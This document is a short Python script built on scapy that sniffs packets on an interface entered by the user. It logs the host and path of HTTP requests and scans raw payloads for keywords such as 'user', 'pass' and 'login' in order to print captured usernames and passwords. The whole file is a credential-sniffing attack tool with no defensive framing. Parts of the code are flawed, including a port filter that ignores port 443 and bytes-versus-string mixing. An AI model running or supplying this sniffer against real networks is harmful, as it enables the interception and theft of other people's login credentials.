#!/usr/bin/env python
# pip install scapy_http (requirements)
import scapy.all as scapy
from pip._vendor.distlib.compat import raw_input
from scapy.layers import http

def extracting_credentials(packets):
    if packets.haslayer(scapy.Raw):  # This will check for if the packet has a raw layer
        loader = packets[scapy.Raw].load
        # Creating wordlist to check for username and password fields and iterate each word in the for loop
        wordlist = ["user", "uname", "usr", "username", "password", "pass", "pwd", "login", "lgn_Button"]
        for key in wordlist:
            if key in loader:  # if the key is found in the loader variable, print the statement once
                return loader

def fetching_url(packets):
    return packets[http.HTTPRequest].Host + packets[http.HTTPRequest].Path # capture host & path

def sniffer(interface):
    # prn is callback function, thus this would allow to callback the function every time a packet is captured.
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet, filter="port 80" or "port 443")

# This function would be called in the prn of the sniffer function and filter data i.e. from http websites
def sniffed_packet(packets):
    if packets.haslayer(http.HTTPRequest): # This will check for http layer
        url = fetching_url(packets) # calling out the fetching_url function and appending to a variable
        print("[+] HTTP Request >> " + url)

        login_info = extracting_credentials(packets)
        if login_info:
            print("\n\n[+] Extracting Username/Passwords >> " + login_info + "\n\n")

# Capturing data from wlan0 interface
user_input = raw_input("[+] Enter Network interface >> ")
print("[+] Starting Sniffer")
sniffer(user_input)

# packets.show(). This would show all the types of packets passing through. Useful for printing any other type layer or
# specific field